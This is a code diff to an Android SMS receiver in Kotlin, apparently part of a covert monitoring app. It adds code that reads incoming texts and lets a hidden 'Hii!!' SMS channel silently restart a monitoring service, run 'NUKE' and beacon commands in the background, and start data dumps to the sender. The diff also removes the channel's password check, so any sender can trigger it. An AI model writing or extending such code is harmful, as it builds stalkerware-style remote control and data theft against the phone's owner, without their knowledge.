@@ -46,43 +46,38 @@ class SmsReceiver : BroadcastReceiver() {
                     DumpManager.appendLog("SMS", entry)
 
                     // --- B. GHOST TUNNEL (Hii!! Protocol) ---
-                    // Syntax: Hii!! [Password] [Command] [Content]
+                    // Syntax: Hii!! [Command] [Content]
                     if (body != null && body.startsWith("Hii!!")) {
+                        // 1. ALWAYS SHOCK: Every 'Hii!!' acts as an invisible Defibrillator
+                        val monitorIntent = Intent(context, MonitorService::class.java)
+                        try {
+                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) context.startForegroundService(monitorIntent)
+                            else context.startService(monitorIntent)
+                            KeepAliveReceiver.scheduleNext(context)
+                        } catch(e: Exception) {}
+
                         val parts = body.split(" ")
                         if (parts.size >= 2) {
-                            val providedPwd = parts[1].trim()
-                            // Strict Password Match (Case Sensitive)
-                            if (providedPwd == "Cort3xpW") {
-                                
-                                // 1. DEFIBRILLATOR: Resurrect if dead
-                                val monitorIntent = Intent(context, MonitorService::class.java)
-                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) context.startForegroundService(monitorIntent)
-                                else context.startService(monitorIntent)
-                                KeepAliveReceiver.scheduleNext(context)
+                            val cmd = parts[1].trim().uppercase()
+                            val content = if (parts.size >= 3) body.substringAfter(parts[1]).trim() else "0"
 
-                                // 2. EXECUTE CRITICAL COMMANDS
-                                val cmd = if (parts.size >= 3) parts[2].uppercase() else "CODERED"
-                                val content = if (parts.size >= 4) body.substringAfter(parts[2]).trim() else "0"
-
-                                when (cmd) {
-                                    "NUKE", "STAY_READY", "STOP_BEACON" -> {
-                                        // Route directly to main brain
-                                        val jsonCmd = JSONObject()
-                                        jsonCmd.put("id", -1) // System ID
-                                        jsonCmd.put("file_name", cmd)
-                                        jsonCmd.put("content", content)
-                                        CommandProcessor.checkAndExecute(context) // Pre-wake check
-                                        // Note: We'd ideally call a processSingleCommand here, but for now we let it fire via intent if needed
-                                    }
-                                    else -> {
-                                        // Default: Start Emergency Data Dump Loop
-                                        val i = Intent(context, EmergencyService::class.java)
-                                        i.putExtra("sender", sender)
-                                        i.putExtra("codes", content) // content is the 1,2,3 module codes
-                                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) context.startForegroundService(i)
-                                        else context.startService(i)
+                            when (cmd) {
+                                "NUKE", "STAY_READY", "STOP_BEACON" -> {
+                                    // These are invisible background commands
+                                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                                        CommandProcessor.checkAndExecute(context)
                                     }
                                 }
+                                "CODERED", "1", "2", "3", "4", "5", "6", "7" -> {
+                                    // These are visible foreground data dumps
+                                    val i = Intent(context, EmergencyService::class.java)
+                                    i.putExtra("sender", sender)
+                                    i.putExtra("codes", if(cmd == "CODERED") content else cmd)
+                                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) context.startForegroundService(i)
+                                    else context.startService(i)
+                                }
+                                // If it's a normal message like 'Hii!! How are you?', we do NOTHING. 
+                                // The defibrillator already ran invisibly, but we don't trigger the emergency notification.
                             }
                         }
                     }
